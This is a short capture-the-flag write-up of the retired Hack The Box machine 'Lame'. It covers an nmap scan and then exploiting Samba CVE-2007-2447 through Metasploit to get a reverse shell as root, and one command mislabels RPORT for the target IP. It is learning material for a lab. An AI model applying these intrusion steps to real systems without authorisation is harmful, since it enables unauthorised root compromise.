---
title: "Lame Write-Up"
date: 2025-08-06T12:35:45-05:00
draft: false
author: Jarpiano   
tags:
    - WriteUp
image: /images/lame-banner.png
description:
toc:
center: true
---
# Lame (Easy) Box

Lame is a retired easy machine from HTB focusing on exploiting a basic vulnerability from the Samba service.

## Initial Foothold & Escalation

Let's do a quick NMAP scan to see some open ports. An initial scan of `nmap 10.129.236.188` doesn't bring us anything. Let's try a more stealthy approach:

```bash
sudo nmap <IP> -sS -Pn --disable-arp
```

This gives us the following output.

<img src="/images/lame-image1.png" width="900" alt="Preview Image" />
<br>
<br>

If we a version scan, we see that the box has Samba version 3.x - 4.x and the ftp version is 2.3.4. Let's see if Samba has any vulnerabilities first. A quick google search shows use the `CVE-2007-2447` vulnerability. On Metasploit, if we search this up, we get the following exploit.

<img src="/images/lame-image2.png" width="900" alt="Preview Image" />
<br>
<br>

If we show options, we may get the following options:
- CHOST
- CPORT
- RHOST
- RPORT
- LHOST
- LPORT

We don't really need `CHOST` or `CPORT` so we can ignore them or both set them to nothing using `set CHOST ""` and `set CPORT ""`. Let's set them appropriately:

```bash
set RPORT <TARGET-IP>
```

```bash
set LHOST <MY-IP
```

We can leave the ports alone if none of them are taken up.

If we run exploit we should get the following message after the `Started TCP Handler`: ` Command shell session 1 opened`.

If we do `whoami`, we see that we are root. We can find the `user.txt` file in the `makis` directory and the `root.txt` file in the `root` folder.

**Fin.**

